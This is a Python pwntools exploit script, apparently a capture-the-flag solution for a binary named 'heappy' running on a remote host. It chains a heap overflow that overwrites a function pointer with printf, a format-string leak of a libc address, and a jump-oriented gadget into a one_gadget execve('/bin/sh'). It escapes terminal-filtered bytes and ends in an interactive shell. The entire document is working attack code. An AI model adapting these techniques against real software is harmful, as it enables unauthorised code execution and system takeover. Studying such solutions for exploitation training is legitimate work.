from pwn import *


def main():
    local = False
    filename = "./heappy_patchelf"
    elf = ELF(filename)
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    if local:
        r = process([filename])
    else:
        r = remote("193.20.1.11", 5000)
    padding = 144
    target = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(target)
    payload = payload[:-1] # the last null byte is added by scanf
    # choose language
    r.sendline(b"1")
    # choose name
    r.sendline(b"pwn")
    # change language -> allocate new chunk
    r.sendline(b"2")
    # ita language
    r.sendline(b"2")
    # change name
    r.sendline(b"1")
    # overflow in functions' chunk
    r.sendline(payload)
    # choose name again to perform format string attack
    r.sendline(b"1")
    # for libc leak
    r.sendline(b'%13$p')
    r.recvuntil(b'0x')
    leak = r.recvline()
    leak = bytes.fromhex(leak[:12].decode())[::-1]
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 245 - libc.symbols["__libc_start_main"]
    # 0x0000000000198aec : pop rax ; xor al, 0xed ; jmp qword ptr [rdx]
    # to satisfy:
    """
    0x4647c execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    """
    move_stack_JOP_gadget = p64(libc.address + 0x0000000000198aec)
    one_gadget_RCE_constrained = p64(libc.address + 0x4647c)
    if not local:
        # need to escape chars that are filtered by tty; the escape sequence will be stripped
        tty_wrap = lambda x: b''.join([b'\x16' + i.to_bytes(1, 'little') for i in x])
        move_stack_JOP_gadget = tty_wrap(move_stack_JOP_gadget)
        one_gadget_RCE_constrained = tty_wrap(one_gadget_RCE_constrained)
    payload = one_gadget_RCE_constrained + b"A" * (padding - 8) + move_stack_JOP_gadget
    # bad chars for scanf
    bad_chars = [b'\t', b'\n', b' ']
    assert all([i not in payload for i in bad_chars])
    r.sendline(b"1")
    r.sendline(payload)
    r.recv(timeout = 2)
    if not local:
        pwnlib.term.term_mode = False
    r.interactive()


if __name__ == "__main__":
    main()

    

 
